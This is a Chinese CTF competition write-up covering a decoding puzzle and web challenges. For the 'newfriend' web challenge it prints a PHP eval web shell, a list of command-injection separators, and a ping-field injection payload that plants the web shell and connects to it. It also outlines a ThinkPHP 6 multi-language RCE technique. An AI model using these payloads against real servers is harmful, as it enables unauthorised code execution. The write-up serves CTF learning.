# 2023-04-09 WP

> 山大 山科网络安全大赛

__0x00 Web签到__

e...  一共没做几个题，还全是签到，至于我是怎么知道的，开心消消乐玩多了，玩通关了。。

__0x01 Misc签到__

这个一串神秘字符看上去就像Base16编码后的内容，然后有四个神秘数字：16，32，13，64  就可以猜测分别是Base16，Base32，Rot13，Base64然后依次解码就好。

__0x02 结束__

第一次参加线下赛，一共就做了俩题，这次就主打一个陪跑了（doge）,也写不出有建设性的wp(bei)

__0x03 问题__

关于两个有所进展但没有结果的题，在结束后有了结果（bei）：

* [Web] newfriend

> 已经知道了无法传统的方法上传一句话木马，然后传完与蚁剑完成了连接，看到了flag文件，最后就差在了权限不够

1. 开始想建立一个木马文件pass.php

```
<?php @eval($_POST['pass']);?>
````

然后把他文件名改成png，先传入再通过burpsuite抓包，将后缀名修改之后再返回，但是试了php,phtml,php5都不行，就放弃了。

2. 看见下面有可以ping的地方,命令注入的界面能执行ping命令，能执行ping命令就说明能执行系统命令

> 常见的shell注入命令及连接符

```
Ipconfig 查看本地网络

Net user 查看系统用户

Dir 查看当前目录

Find 查找包含指定字符的行

Whoami 查看系统当前有效用户名

A&B 简单的拼接，AB之间无制约关系

A&&B A执行成功才会执行B

A|B A的输出作为B的输入

A||B A执行失败，然后才会执行B
```

先来尝试一下：127.0.0.1&whoami ---得到回显，可以进行系统命令

2. echo一个一句话木马回目标网站

```
127.0.0.1&echo "<?php @eval(\$_POST['test']);?>" > 2333.php
```

> 不知道需不需要base64编码，我没有编。

这个时候再看ls就会发现2333.php已经在目录里了

3. 与蚁剑连接，http:xxx:xxx/2333.php  test

打开虚拟终端，在根目录下发现flag文件，直接cat flag 得到TKHASH{h1ll0_m1_new_fr1ends}

> 说是有权限限制为啥没遇到，但是在比赛中我确实遇到了禁止访问flag权限不够，尝试了su,sudo,chmod等等直接搞崩了连接还是不行，结果结束比赛步骤都一样就又行了？


* [Web] think

> 已知问题出现于thinkphp的多语言漏洞，却无法与蚁剑最后实现连接。

果然考察的是活学活用，thinkphp v6.0.12的多语言rce漏洞，很新啊，得先学

可以参考[借鉴](https://blog.vvbbnn00.cn/archives/realworldctf2023-ti-yan-sai-bu-fen-ti-jie)

[Thinkphp6完全开发手册](https://www.kancloud.cn/manual/thinkphp6_0/1037637)
 
 原理：
 
> 程序本身开启了多语言功能，攻击者可以通过get，post，header，cookie等位置传入参数。实现目录穿越+文件包含，通过pearcmd文件包含这个trick即可实现RCE。

> 多语言中间件：
>  > 开启了多应用模式的情况下：全局中间删掉了注释的情况下，在具体的应用下面的middleware.php 也要启用 \think\middleware\LoadLangPack::class 该应用模块才能识别多语言

* [Web] y1's Blog

关于最新的cve漏洞，考察2023REALWORLD比赛中一题


> 先这样
